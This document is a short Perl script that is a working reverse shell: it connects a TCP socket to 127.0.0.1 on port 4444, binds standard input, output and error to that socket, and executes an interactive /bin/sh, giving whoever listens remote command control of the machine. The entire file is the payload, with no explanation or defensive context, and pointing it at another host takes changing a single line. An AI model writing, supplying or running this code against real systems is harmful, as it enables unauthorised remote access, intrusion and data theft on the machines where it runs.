use Socket;

$ip="127.0.0.1";
$port=4444;

socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));

if(connect(S, sockaddr_in($port, inet_aton($ip))))
{
	open(STDIN,">&S");
	open(STDOUT,">&S");
	open(STDERR,">&S");
	exec("/bin/sh -i");
};
